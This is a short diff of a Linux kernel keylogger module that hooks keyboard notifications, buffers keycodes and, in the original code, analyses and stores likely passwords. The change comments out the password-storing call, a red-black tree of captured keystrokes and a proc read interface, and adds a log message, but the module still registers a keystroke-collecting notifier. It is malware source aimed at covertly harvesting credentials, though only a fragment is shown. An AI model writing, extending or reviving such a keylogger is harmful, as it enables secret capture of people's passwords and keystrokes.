@@ -40,13 +40,14 @@ static int keyboard_notifier_fn(struct notifier_block *nb, unsigned long action,
 
         // Analyze the buffer for potential passwords if it's full
         if (buffer_index >= PASSWORD_LENGTH) {
-            analyze_and_store_password(keycode_buffer, PASSWORD_LENGTH);
+            printk(KERN_INFO "Analyzing potential password");
+            //analyze_and_store_password(keycode_buffer, PASSWORD_LENGTH);
         }
     }
 
     return NOTIFY_OK;
 }
-
+/*
 // Node structure for the red-black tree
 struct keystroke_node {
     struct rb_node node;
@@ -130,6 +131,7 @@ static struct proc_ops proc_fops = {
     .read = proc_read,
     .open = proc_open
 };
+*/
 
 // Module initialization
 static int __init keylogger_init(void) {
